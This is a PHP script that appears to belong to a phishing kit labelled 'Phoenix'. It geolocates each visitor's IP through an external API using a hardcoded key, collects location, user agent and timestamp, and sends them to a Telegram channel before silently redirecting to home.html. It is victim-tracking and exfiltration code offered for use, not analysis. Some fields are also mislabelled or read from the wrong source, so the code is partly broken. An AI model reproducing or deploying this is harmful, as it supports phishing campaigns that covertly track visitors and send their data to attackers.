<?php
include("config/config.php");
//Server Variables

    $PublicIP = get_client_ip();
    $json  = file_get_contents('https://api.snoopi.io/$PublicIP?apikey=cb4c14cbeb5f901823f533fa241f5057');
    $json  =  json_decode($json ,true);
    
    $ip = getenv("REMOTE_ADDR");
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $CountryCode  = $json['CountryCode'];
    $CountryName  = $json['CountryName'];
    $GeoID        = $json['GeoID'];
    $State        = $json['State'];
    $StateCode    = $json['StateCode'];
    $City         = $json['City'];
    $Postal       = $json['Postal'];
    $Latitude     = $json['Latitude'];
    $Longitude    = $json['Longitude'];
    $RequestTime  = $json['RequestTime'];
    $RequestedIP  = $json['RequestedIP'];
    $serv = $_REQUEST['log1'];


        //Telegram send
        $message = "**NEW-PHOENIX-VISITOR\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "Country code: ".$_POST['CountryCode']."\n";
        $message .= "----------------------------------------\n";
        $message .= "Country: ".$_POST['CountryName']."\n";
        $message .= "----------------------------------------\n";
        $message .= "GeoID: ".$_POST['GeoID']."\n";
        $message .= "----------------------------------------\n";
        $message .= "State: ".$_POST['State']."\n";
        $message .= "----------------------------------------\n";
        $message .= "State Code: ".$_POST['StateCode']."\n";
        $message .= "----------------------------------------\n";
        $message .= "City: ".$_POST['City']."\n";
        $message .= "----------------------------------------\n";
        $message .= "Postal: ".$_POST['Postal']."\n";
        $message .= "----------------------------------------\n";
        $message .= "Latitude: ".$_POST['Latitude']."\n";
        $message .= "----------------------------------------\n";
        $message .= "Longitude: ".$_POST['RequestTime']."\n";
        $message .= "----------------------------------------\n";
        $message .= "Requested IP: ".$_POST['RequestedIP']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:home.html");
?>
